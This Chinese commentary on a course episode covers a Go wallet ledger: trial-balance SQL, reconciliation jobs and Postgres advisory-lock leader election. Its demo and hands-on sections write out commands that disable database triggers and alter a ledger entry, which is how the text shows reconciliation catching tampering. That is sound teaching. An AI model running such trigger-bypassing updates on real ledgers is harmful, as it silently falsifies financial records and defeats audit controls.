**如果不处理 `yield` 的返回值**，Store 会**继续读完全部数据**，而没有人要——**白烧 CPU 和 IO，还占着数据库连接**。

> **"调用方提前退出"在流式 API 里是常态**（客户端断线、用户取消），所以**必须处理**。

### 短页即末页

> `[16:11:45]` **a page shorter than 500 is the last one, so we never run an extra query just to learn there's nothing left.**

> **译文**：**一页不足 500 条就是最后一页，所以我们永远不会为了知道"没有了"而多跑一次查询。**

💡 这是**用返回值形状表达"结束"**：

| 方案 | 每份数据的查询数 |
|---|---|
| `len(page) == 0` 判断 | **+1 次空查询** |
| `len(page) < pageSize` | **0 次额外** |
| 先 `COUNT(*)` | +1 次全量计数（**更糟**） |

> 而 `len(page) == 0` 的写法在**正好整除**时会多跑一次（10 万条 / 500 = 200 页，第 201 次返回空）。
>
> **`len(page) < pageSize` 在整除时也不会多跑**——因为第 200 页返回 500 条... 等等，那时它不知道有没有第 201 页。
>
> **所以两者在"正好整除"时都需要一次额外查询。** 差别只在"不整除"时（绝大多数情况）省一次。

### 服务层：先鉴权，再开始流

> `[16:12:00]` **the service's `Statement` checks that the caller may see the wallet, with the same lookup as every other wallet route, so someone else's wallet is a 404 before a single byte is streamed.**

> **译文**：**服务的 `Statement` 检查调用方能不能看这个钱包，用和其他每条钱包路由一样的查找，所以别人的钱包在**任何一个字节被流出去之前**就是 404。**

💡 这一条极其重要，因为**流式响应已经无法改状态码**：

```
❌ 先开始流 → 第 3 行发现"这不是你的钱包" → 只能 abort
   → 客户端看到"下载失败"，而不是"404 无权访问"

✅ 先鉴权 → 404（正常的 JSON 错误）
   → 客户端知道该做什么
```

> `[16:13:38]` **every error so far — a bad date, or someone else's wallet — is still an ordinary JSON error with the right status, because nothing has been written yet.** **From here on, the status goes out with the first bytes.**

> **译文**：**到目前为止的每一个错误——一个坏日期，或者别人的钱包——仍然是一个带正确状态码的普通 JSON 错误，因为什么都还没写出去。** **从这里开始，状态随第一批字节一起出去。**

## 15. 报表二：给财务的 trial balance

> `[16:08:46]` **and the trial balance for finance: every entry before a moment, labeled with its ledger account — system accounts by name, and every customer wallet together as one account called "customer wallets", the way an accountant sees them** — then **sum the debits and the credits grouped by currency, with rollup, which adds one more row per currency with the totals. That row is labeled "total", and its debits must equal its credits.**

> **译文**：**还有给财务的试算平衡表：某个时刻之前的每一条分录，用它的账本账户标注——系统账户用名字，而每个客户钱包合并成一个叫 "customer wallets" 的账户，就像会计看它们的方式**——然后**按货币分组对借方和贷方求和，带 rollup，它为每种货币多加一行总计。那一行标成 "total"，而它的借方必须等于它的贷方。**

```sql
SELECT currency, coalesce(account, 'total')::text AS account,
       sum(debit)::bigint AS debits, sum(credit)::bigint AS credits
FROM (
    SELECT a.currency,
           CASE a.kind WHEN 'wallet' THEN 'customer wallets' ELSE a.name END AS account,
           CASE e.direction WHEN 'debit'  THEN e.amount ELSE 0 END AS debit,
           CASE e.direction WHEN 'credit' THEN e.amount ELSE 0 END AS credit
    FROM entries e JOIN accounts a ON a.id = e.account_id
    WHERE e.created_at < @before
) AS lines
GROUP BY currency, ROLLUP (account)
ORDER BY currency, account IS NULL, account;
```

💡 三个 SQL 技巧：

**① `ROLLUP` 生成总计行**

```
GROUP BY currency, ROLLUP(account)
  → 每种货币的每个账户一行
  + 每种货币的总计一行（account = NULL）
```

**这是 SQL 标准里的"分层小计"**，比写 `UNION ALL` 干净得多。

**② `coalesce(account, 'total')` 给总计行命名**

**因为 `ROLLUP` 产生的行里 `account` 是 `NULL`**，所以要替换成人能读的标签。

**③ `ORDER BY currency, account IS NULL, account`**

这个排序把 **NULL（总计行）排在最后**——因为 `account IS NULL` 在 bool 排序里 `false(0) < true(1)`。

> **如果直接 `ORDER BY account`，Postgres 默认 `NULLS LAST` 会恰好正确，但那是默认行为不是保证。** 显式写出来更安全。

**为什么把客户钱包合并成一行？**

> `[16:09:02]` ...**the way an accountant sees them.**

> **译文**：……**就像会计看它们的方式。**

💡 财务**不关心**具体哪个客户有多少钱（那是运营数据），财务关心的是：

```
我们欠客户多少钱（负债）
我们自己的账户有多少（资产/收入）
```

**所以 1000 个客户钱包在财务眼里是"一个负债科目"。**

> **同一个数据库，两种读法**：运营视角（每个钱包）和财务视角（科目汇总）。
>
> **而"用哪个视角"是使用者决定的，不是 schema 决定的。** 这就是为什么 SQL 里有一个 `CASE`——**把物理结构映射到使用者心里的结构。**

> `[16:12:35]` ...**and on the service, it's for us, never for customers, and only an internal route calls it.**

> **译文**：……**而在服务上，它是给我们自己的，永远不给客户，只有一条 internal 路由调它。**

```go
mux.HandleFunc("GET /internal/trial-balance", ...)     // 网关不转发 /internal
```

💡 和 EP13 的 `/internal/users/{id}` 是**同一个模式**：**内部路由放在网关不转发的路径上**。

> `[16:12:52]` **two thin methods for one query can look like ceremony, but they keep the layers honest: handlers talk to the service, and only the store knows SQL.**

> **译文**：**为了一条查询写两个薄方法看起来像仪式，但它们让分层保持诚实：handler 和 service 说话，只有 store 知道 SQL。**

💡 这是一个**为"正确性"付出"看起来冗余"的价格**，作者主动承认了：

```go
// store 上
func (s *Store) TrialBalance(ctx context.Context, before time.Time) ([]TrialBalanceLine, error)
// service 上
func (s *Service) TrialBalance(ctx context.Context, before time.Time) ([]TrialBalanceLine, error) {
	return s.store.TrialBalance(ctx, before)
}
```

**两个方法，一个实现就是转发。** 看起来是浪费。但：

> **如果 handler 直接调 store**，那么"只有 store 知道 SQL"这条规则就破了，而**下一个人就会在 handler 里写 `pool.Query`。**

**分层的价值不是"每层都有逻辑"，而是"任何一层都不越界"。** 空的转发层**保住了这条边界**。

---

## 16. 现场：故意破坏账本

这是本集**最精彩的演示**，也是全书最诚实的自我检验。

### 先确认干净

> `[16:22:16]` ...**meanwhile the reconciliation has been running every 15 seconds.** Here are **the last three runs in `job_runs`: one slot each, 15 seconds apart, all succeeded in a few milliseconds.** And `make reconciliation`: **zero rows, a clean ledger.** In Grafana, **the new panel on the right: discrepancies, a green zero.**

> **译文**：……**与此同时对账一直在每 15 秒跑一次。** 这里是 **`job_runs` 里最后三次运行：每个一个 slot，相隔 15 秒，全都在几毫秒内成功。** 而 `make reconciliation`：**零行，一个干净的账本。** 在 Grafana 里，**右边那个新面板：discrepancies，一个绿色的零。**

### 然后用手工 UPDATE 破坏它

> `[16:22:46]` **now the support ticket**: Alice says her deposit was \$10 short, and **someone with database access fixes it by hand** — `replica` mode, so the triggers keep quiet — **and \$10 more on the deposit's credit, by its transaction id from the deposit's response.** **One row updated, and no error anywhere.**

> **译文**：**现在来了一个支持工单**：Alice 说她的存款少了 \$10，于是**一个有数据库权限的人手工修它**——用 `replica` 模式，这样触发器保持安静——**在那笔存款的贷方上加了 \$10，用存款响应里的那个事务 id 定位**。**一行被更新了，而任何地方都没有报错。**

```sql
-- 现场执行的两条，就是这个
SET session_replication_role = replica;                          -- 关掉触发器
UPDATE entries SET amount = amount + 1000
  WHERE transaction_id = '0190e4...' AND direction = 'credit';   -- +$10
```

> `[16:23:01]` **Alice's balance: \$495 — \$10 more than her statement said.** **\$10 that came from nowhere.** **The bank holds 500, and we now owe our customers 510.**

> **译文**：**Alice 的余额：\$495——比她账单上说的多了 \$10。** **\$10 凭空而来。** **银行里躺着 500，而我们现在欠客户 510。**

💡 "**the bank holds 500, and we now owe our customers 510**" 是本集最重要的一句话。它把技术错误翻译成了**业务事实**：

> **我们有 10 美元不存在。** 而这**不是"账本不平衡"**——恰恰相反，**账本完美平衡**：

```
原来的分录：
  借  settlement(USD)  50000
  贷  Alice 钱包        50000
平衡 ✅

手工改之后：
  借  settlement(USD)  50000      ← 没变
  贷  Alice 钱包        51000      ← +1000
不平衡 ❌  ← 但触发器被关了，所以没人检查
```

**这就是为什么 §0 理由一说的"约束管不到"**：触发器被关掉了。

### 15 秒后，对账抓住它

> `[16:23:16]` **within 15 seconds, the next run.** `make reconciliation`: **two rows. The trial balance in USD is off by minus a thousand cents — credits exceed debits by \$10 — and the culprit by ID: the deposit's own transaction, off by the same amount.** **Not a vague "debits don't equal credits", but exactly where to look.**

> **译文**：**15 秒之内，下一次运行。** `make reconciliation`：**两行。USD 的试算平衡差了负一千分——贷方超过借方 \$10——以及按 ID 找到的元凶：那笔存款自己的交易，差同样的数额。** **不是含糊的"借贷不等"，而是精确到该看哪里。**

💡 **两条 discrepancy 是同一件事的两个视角**：

| check | ref | expected | actual |
|---|---|---|---|
| `trial_balance` | `all entries` | 0 | **-1000** |
| `unbalanced_transaction` | `0190e4...` | 0 | **-1000** |

**第一条说"有一种货币不平"，第二条说"是哪一笔交易"。**

> **这就是为什么检查要分层**：全局的检查**不会误报**（它只在自己为真时才报），但它**不告诉你位置**；局部的检查**精确**，但**只在那一笔真的不平**时才有效。
>
> **两者都有，才是"可行动的告警"。**

> `[16:23:49]` ...**and Grafana: discrepancies, two, in red. That's the panel, and the same expression would page whoever is on call, with a link to a runbook: what to check first, and who's allowed to correct the ledger.**

> **译文**：……**而 Grafana 里：discrepancies，2，红色。那就是那个面板，而同一个表达式会呼叫值班的人，附一个 runbook 链接：先检查什么，以及谁有权限修正账本。**

### 修的方式：不改历史

> `[16:24:04]` **in a real ledger, you'd never edit history to fix this: you'd post a correcting transaction, with both sides, and a description that says why.** **Here we are undoing our own sabotage, so the same update backwards.**

> **译文**：**在一个真实的账本里，你永远不会为了修这个去改历史：你会记一笔更正交易，两边都有，加一条说明为什么的描述。** **这里我们是在撤销自己的破坏，所以同一条 update 反过来做。**

💡 这是**会计的基本纪律**，而在软件里它常常被违反：

| 做法 | 可审计？ | 我们为什么不能这样 |
|---|---|---|
| `UPDATE entries SET amount = ...` | ❌ **历史被抹掉了** | 审计师会问"为什么这条分录和当初不一样" |
| 记一笔更正交易 | ✅ 两条都留着 | 能看到"错了什么、什么时候修的、为什么" |

**更正交易长什么样**：

```
借  Alice 钱包     1000     ← 把多加的减回去（通过一笔新交易）
贷  settlement     1000
描述： "correction: reversal of manual adjustment on 0190e4..., ticket #1234"
```

> **"ledger is append-only"（EP02）不是性能优化，是审计要求。** 一旦允许 UPDATE，**历史就不再是证据**。

而 `[16:24:21]` 那句 "**we don't take the fix on trust, we wait for the next run**"（**我们不信任这次修复，我们等下一次运行**）也很重要：

> **修完之后不宣布"好了"，而是让对账再说一次"零行"。** 这是**验证闭环**——和 EP09 的 `checkbooks` 是同一个思想。

---

## 17. 选主现场：`kill -9` 之后毫秒级接管

> `[16:24:37]` **now leader election, live: the wallet in compose leads right now. Let's start a second replica on this machine**, in a new terminal, with the same 15-second schedule and other ports. **It connects to the same database, and logs "waiting to lead"** — **it's sitting inside `pg_advisory_lock`, in line.**

> **译文**：**现在看选主，现场：compose 里的 wallet 现在是 leader。我们在这台机器上再起第二个副本**，新终端，同样的 15 秒调度，别的端口。**它连到同一个数据库，日志说 "waiting to lead"**——**它正坐在 `pg_advisory_lock` 里面排队。**

> `[16:24:53]` **now the leader crashes: `docker compose kill` sends SIGKILL, no graceful shutdown, no chance to release anything.** **And the second replica is leading within a moment of the kill.** **When the process died, its connection closed, PostgreSQL ended the session, and released the lock — and the waiting call returned.**

> **译文**：**现在 leader 崩溃：`docker compose kill` 发 SIGKILL，没有优雅关闭，没有机会释放任何东西。** **而第二个副本在 kill 之后的一瞬间就成了 leader。** **当进程死掉时，它的连接关闭了，PostgreSQL 结束了那个会话、释放了锁——而那个等待中的调用返回了。**

💡 **这是 advisory lock 相对于 Redis `SET NX` + TTL 的核心优势**：

| | Redis + TTL | **advisory lock** |
|---|---|---|
| leader 崩溃后多久释放 | **等 TTL 到期**（可能是 30 秒） | **立刻**（TCP 连接关闭 → 会话结束） |
| 需要续期吗 | ✅ 必须 | ❌ **不需要** |
| 需要担心时钟吗 | ✅ | ❌ |
| 优雅关闭要做什么 | 主动 DEL | **什么都不用做** |

> **"进程死掉 → 操作系统关闭 socket → Postgres 看到 EOF → 结束会话 → 释放锁"** 这条链**不依赖任何应用代码**。
>
> **这是"用操作系统的保证，而不是用应用代码的保证"**——而操作系统的保证更可靠，因为**它连 `kill -9` 都防不住你（它直接执行）。**

而 `[16:25:09]` 那句 "**the waiting call returned**" 说明了 `pg_advisory_lock`（**阻塞版**）的好处：

> `[15:52:39]` **this is the blocking version: it waits inside Postgres while someone else holds the lock, and returns the moment it's free, so a follower takes over within milliseconds without polling.**

> **译文**：**这是阻塞版：当别人持锁时它**在 Postgres 内部等**，一旦空闲就返回，所以一个 follower 在毫秒内接管，不用轮询。**

💡 `pg_advisory_lock` vs `pg_try_advisory_lock`：

| | 行为 | follower 的开销 |
|---|---|---|
| `pg_try_advisory_lock` | 立即返回 true/false | **必须轮询**（每秒一次 → 1 秒延迟 + 每秒一次查询） |
| **`pg_advisory_lock`** | **阻塞等待** | **零轮询**，释放即返回（毫秒级） |

> **"在数据库里等"比"在应用里轮询"好**，因为：
> - 没有轮询间隔的延迟
> - 没有轮询产生的查询负载
> - **Postgres 在锁释放时会主动唤醒等待者**（内部条件变量）

### 优雅关闭时的接管更快

> `[16:25:25]` ...**and a graceful stop: Ctrl-C — stepping down comes right at the start of the shutdown, before the server's drain, so the lock is free the moment we're asked to stop, and another replica could take over while this one finishes its requests.**

> **译文**：……**而优雅停止：Ctrl-C——"下台"发生在关闭的**最开始**、在服务器 drain 之前，所以锁在我们被要求停止的那一刻就空出来了，而另一个副本可以在**这一个还在处理请求的时候**接管。**

💡 这是**一个刻意的设计**，而且它和 §9 的 defer 顺序**看起来矛盾**：

```
§9:  先停任务 → 等等任务停 → 然后释放锁   （绝不重叠）
§17: 一被要求停止 → 立刻释放锁            （允许接管）
```

**为什么两者不矛盾？** 因为**锁保护的东西不同**：

| 锁保护什么 | 释放时机 | 理由 |
|---|---|---|
| **任务不重叠运行** | 任务停下之后 | 任务会改数据库，重叠有风险 |
| **整体可用性** | 收到信号立刻 | **API 请求不受锁保护**，早释放让别人早点干活 |

💡 仔细看代码就明白了：**"收到信号 → 释放锁"这条路径走的是 `ctx.Done()` → `campaign` 返回 → **defer 栈照常执行（先 cancel、再 wait、最后 close）**。

> 所以**实际上仍然是"任务停完才释放锁"**。作者那句话的准确意思是：**"下台的决定"在关闭一开始就做了**（`ctx` 被取消），而**锁的释放仍然在任务停止之后**。
>
> **但行为上的效果是**：`campaign` 一返回，defer 链立刻开始跑，而任务通常**几毫秒内就停了**（它们只是"下一次该跑的时候检查 ctx"）。所以**接管几乎立刻发生**。

---

## 18. 外部对账：形状完全一样

> `[16:25:55]` **one more kind of reconciliation, the one auditors care about most: against the bank.** **Every day the bank sends a statement of our settlement account, often as a file.** **Each line is matched with our ledger by reference and amount, within a few days, since banks post late.**

> **译文**：**还有一种对账，也是审计师最关心的：对银行。** **每天银行会发一份我们 settlement 账户的对账单，通常是一个文件。** **每一行按 reference 和金额和我们的账本匹配，允许几天的窗口，因为银行入账会延迟。**

> `[16:26:26]` **most lines match and nothing happens. A line only in our ledger is money we credited that never arrived — chase the bank, or reverse it. A line only at the bank is money we never booked, or a fee — book it with a transaction that says why. And amounts that differ, like a fee taken on the way, go to a person.**

> **译文**：**大多数行匹配上，什么都不发生。只在我们的账本里有的行，是我们贷记了但从未到达的钱——去追银行，或者反向冲销。只在银行那边有的行，是我们从未记账的钱，或者一笔手续费——用一笔说明了原因的交易把它记上。而金额不同的，比如路上被扣了一笔费，交给一个人处理。**

💡 四种组合，一张表（这是**对账的通用矩阵**）：

| 我们的账本 | 银行 | 含义 | 动作 |
|---|---|---|---|
| ✅ | ✅ 金额相同 | 正常 | 无 |
| ✅ | ❌ | **我们记了但钱没到** | 追银行 / 冲销 |
| ❌ | ✅ | **钱到了但我们没记**（或费用） | 记账 + 说明 |
| ✅ | ✅ 金额不同 | **路上被扣费 / 汇率差** | 人工判断 |

> **这个矩阵适用于所有"我们 vs 外部系统"的对账**：银行、支付渠道（Stripe/PayPal）、清算所、甚至"我们的库存 vs 仓储系统"。

> `[16:26:43]` ...**is the same shape as what we built today: a job, the bank's file in, discrepancies out, kept in `job_runs`, and a metric that pages someone.** **The matching rules are where each bank's quirks live, and that's where most of the work goes.**

> **译文**：……**和我们今天建的东西形状完全一样：一个任务、银行文件进来、差异出去、存在 `job_runs` 里、一个会呼叫人的指标。** **匹配规则是每家银行的怪癖所在，而大部分工作都在那里。**

💡 "**that's where most of the work goes**" 是一句**诚实的预告**：

> **外部对账的 90% 工作量在"解析每家银行的不同格式 + 处理它们的怪癖"**，而不是在"对账逻辑"。
>
> 怪癖的例子：日期格式不同、金额带千位分隔符、退款用负号 vs 单独的列、跨月入账、部分匹配、一笔银行记录对应多笔我们的交易……

**而"对账引擎"本身（job + 差异 + 指标）是可以复用的**——这就是为什么作者把它抽到 `internal/platform/jobs`。

---

## 19. 一页总结

### 本集建立的六条规则

| # | 规则 | 为什么 |
|---|---|---|
| 1 | **约束 + 对账，缺一不可** | bug 可以完美平衡；人能关触发器；外部世界看不见 |
| 2 | **`UNIQUE (job, slot)` 就是 fencing** | 选主只需要"通常可靠" |
| 3 | **advisory lock 要自己的连接** | 池会把你的会话（和锁）交给别人 |
| 4 | **对账必须在同一个快照里** | 否则报出"从未存在过的差异" |
| 5 | **`GaugeFunc` 而不是 `Set`** | 旧 leader 会永远报旧值 |
| 6 | **流式响应失败要 abort** | 一个"看起来完整"的短文件是灾难 |

### 三层"信任"的递进

```
第 1 层  EP02 的约束      ：让坏数据写不进去
第 2 层  EP20 的对账      ：找出溜进去的
第 3 层  EP20 的 job_runs ：发现"对账自己没跑"
```

> **第 3 层是最容易被忘掉的**，也是 `[15:45:20]` 那句 "**a check that silently stops running looks exactly like a ledger that's fine**" 的全部含义。

**监控的监控，才是完整的监控。**

### 值得背下来的三句

> `[15:41:27]` **"Constraints keep bad data out, reconciliation finds what got in anyway."**
> **译文**：约束把坏数据挡在外面，对账找出那些还是进来了的。

> `[15:45:20]` **"A check that silently stops running looks exactly like a ledger that's fine."**
> **译文**：一个静默停止运行的检查，看起来和一个没问题的账本一模一样。

> `[15:48:59]` **"When the session ends, for any reason, Postgres releases the lock immediately. The lock lives where the data lives."**
> **译文**：当会话结束，不管是为什么，Postgres 立刻释放那把锁。锁和数据住在同一个地方。

---

## 20. 自己动手

```bash
# 1. 纯算术的测试，不需要数据库
go test ./internal/wallet/ -run 'TestStatement|TestCell|TestFormat' -v

# 2. 调度算术：Next() 的边界
go test ./internal/platform/jobs/ -run TestNext -v
#    注意这两行：1 秒前 due=2:00，正好 2:00 时 due=明天 2:00

# 3. 选主：两个 elector 抢一把锁
go test ./internal/platform/jobs/ -run TestOneLeader -race -v
#    看时间线：a 领先 → b 等待 → a 取消 → b 接管

# 4. 对账 vs 手工破坏
go test ./internal/wallet/ -run TestReconcile -v
#    测试自己会关触发器、改一笔分录、然后断言两条 discrepancy

# 5. 全跑起来，然后破坏账本
#    把 dtl 的 Every 改成 15s（compose 里看 WALLET_RECONCILE_EVERY）
docker compose --profile app up -d
#    走 api/reports.http 里的流程：注册 → 存钱 → 转账 → 下载对账单

# 6. 手工破坏（这一步是本集的核心）
psql $WALLET_DB <<'SQL'
SET session_replication_role = replica;      -- 只有超级用户能做
UPDATE entries SET amount = amount + 1000
WHERE transaction_id = '<那笔存款的 id>' AND direction = 'credit';
SQL

# 7. 15 秒后
make reconciliation
#    两行：trial_balance + unbalanced_transaction，都指向同一个 transaction id

# 8. 手工改回来，再等 15 秒
make reconciliation
#    零行 —— 但真正该做的是记一笔更正交易

# 9. 观察选主
docker compose kill wallet          # SIGKILL，没有优雅关闭
docker compose logs -f wallet-2     # 看它多快说 "leading"
```

### 三个可以拿去问自己的问题

1. **如果 `job_runs` 没有 `UNIQUE (job, slot)`**，选主出 bug 时会发生什么？（提示：同一 slot 跑两次 → 历史里两行 → 你信哪个？）
2. **如果对账用 READ COMMITTED 而不是 REPEATABLE READ**，为什么在**有并发负载的测试里**会随机失败？（提示：holds 检查要读两个量）
3. **为什么 `reconciliation_discrepancies` 用 `GaugeFunc` 读数据库，而 `jobs_leader` 用 `Gauge` 存内存？**（提示：一个是"系统的状态"，一个是"这个副本的状态"；一个是 `max`，一个是 `sum`）

---

## 21. 下一集

> `[16:29:25]` **we trust our constraints, and now we verify them every night.** Next time, **security hardening: mTLS between our services**, in front of the review API, the reports, and the whole service, **with the reviewer named from their sign-in**; **secrets management, OWASP checks, an audit log**, governed access, and **database roles that can't switch triggers off.**

> **译文**：**我们相信我们的约束，而现在我们每晚验证它们。** 下一次：**安全加固——我们的服务之间上 mTLS**，用在 review API、报表、以及整个服务前面，**审阅者从他们的登录身份里取名字**；**密钥管理、OWASP 检查、审计日志**、受管控的访问，以及**不能关掉触发器的数据库角色**。

💡 whisper 把 "**can't** switch triggers off" 听成了 "can switch triggers off"。意思正好相反——而上下文（`[16:30:19]` 的 "make sure none of our services could ever do that tampering"）证实应该是 **can't**。

**这是整个课程里设计得最好的一处前后呼应**，因为它不是“前面埋个伏笔、后面解释一下”，而是：

```
EP20 你先看到：SET session_replication_role = replica;  ← 一把 UPDATE 就能把账改坏
EP21 再学到：数据库角色连这个权限都不该有
```

> **你先感受到痛，再学止痛药。** 顺序反了，你会觉得“最小权限”只是一条合规口号；顺序对了，你知道**它保护的到底是什么**。

💡 EP20 这一集在**为 EP21 挖坑**，而且挖得很明确：

| EP20 里埋的 | EP21 会收的 |
|---|---|
| `[16:01:33]` "only a superuser can switch it on — **a good reason for the least-privilege roles in episode 21**" | **wallet 的数据库角色不该有超级用户权限** |
| `[16:13:07]` "register internal as the trial balance on an internal path, **which the gateway never routes**" | **mTLS** 让“只有内部服务能访问”从**拓扑**变成**密码学** |

> **EP20 的演示之所以能成功**（`SET session_replication_role = replica` 然后改账），**完全依赖于"我们有超级用户权限"**。
>
> **EP21 要做的正是"让这个演示做不出来"。**

**这是全课程里设计得最好的一处前后呼应**：你先看到自己的系统**能被一把 `UPDATE` 破坏**，然后才学**怎么让它不能**。
